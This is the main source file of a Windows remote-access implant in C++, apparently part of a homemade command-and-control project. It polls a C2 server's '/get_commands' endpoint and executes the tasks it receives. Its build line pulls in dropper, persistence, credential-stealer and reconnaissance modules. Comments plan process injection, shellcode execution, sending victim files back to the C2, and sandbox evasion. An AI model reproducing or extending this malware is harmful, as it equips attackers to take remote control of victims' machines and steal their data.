#include "implant.h"
// x86_64-w64-mingw32-g++ implant.cpp execute/execute.cpp dropper/Dropper.cpp file/file.cpp http/http.cpp persist/persist.cpp situational_awareness/GatherInfo.cpp stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp -liphlpapi -lshlwapi -lurlmon -lwininet -lwinhttp  -lbcrypt -lcrypt32 -luserenv -static -o implant.exe   

/* To Implement:
A way to have the binary only run 3
(If someone clicks it 100 times - only shell)

The encryption that we had
*/


/*
This was under execution - idk what it is
Process Injection: support execution of shellcode in either a
remote processes (by pid) or via fork & run

Execution: Payload format
-> Is this the dropper

Implant->File I/O
The implant should be able to
1) Read files from the victim machine and send it back to the C2.
2) Download files from the C2 and write them to disk either
**encrypted**, or **unencrypted**.
*/

/* Note to self sort of:
C2->Database->Implants
Implant ID: Create an ID for the implant to distinguish is from others
Computer Name: What computer did it connect from?
Username: What user are you running as?
GUID: What is the computer's GUID?
Integrity: What privileges do you have?
Connecting IP address: what address did it connect from?
Session Key: After you negotiated a session key, store it per agent
Sleep: How often does the agent check in?
Jitter: How random of a check in is it?
First Seen: When did the agent first check in?
Last Seen: When was the the last time you saw the agent?
Expected Check in: When should you expect to see the agent again?
*/

void IWillRunForever(void){
    while(true){

        /* THIS IS GETTING US COMMANDS EVERY MINUTE */
		std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
        json converted_new_item = json::parse(new_item);
        int num_of_tasks = converted_new_item.size();

        for(int i = 0; i < num_of_tasks; i++){
            /* Only execute commands that are untouched */
            std::string line = converted_new_item.at(i).at(2);

			/* Parsing out commands and args */
			std::istringstream ss(line);
			std::string command;
			std::string args;
			ss >> command;
			ss >> args;
      
			/* Calling Execute - Sending Command, Args, Task_ID, Implant_ID */
            execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
        }

		/* Shortened Sleep to be able to test more efficiently */
        Sleep(10000);  
        //Sleep(60000);
    }
}

void registerimplant(void){

	/* This has yet to be Tested - Currently receives a 500 error */
    std::string jitter = std::to_string(5);
    std::string sleep = std::to_string(60000);
    HttpRegisterImplant("/register_implant", jitter, sleep);
    return;
}

BOOL CheckInstance(){
    HANDLE  m_hStartEvent = CreateEventA( NULL, FALSE, FALSE, "GABBAGOOL" );
    if(m_hStartEvent == NULL) {
        CloseHandle( m_hStartEvent ); 
        return false;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle( m_hStartEvent ); 
        m_hStartEvent = NULL;
        return false;
    }
    return true;
}

int main(int argc, char* argv[]){

    /* Registering Implant */
    //registerimplant();

    /* HOW ARE WE GETTING IMPLANT ID?*/

    /* Sandbox Detection */
    // printf("Executing Sandbox Detection\n");
    // if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
    //     exit(0);
    // }
    
    /* Receive Tasks, Execute Tasks, Send Back Tasks */
    if (!CheckInstance()){
        printf("ALREADY RUN\n");
        return -1;
    }
    IWillRunForever();
    return 0;
}